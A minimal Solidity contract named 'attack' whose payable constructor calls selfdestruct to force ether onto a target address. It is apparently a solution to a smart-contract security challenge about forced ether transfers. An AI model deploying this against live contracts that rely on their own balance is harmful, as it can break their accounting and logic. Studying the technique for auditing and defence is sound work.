// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract attack {
    constructor(address payable forceAddress) payable {
        selfdestruct(forceAddress);
    }
}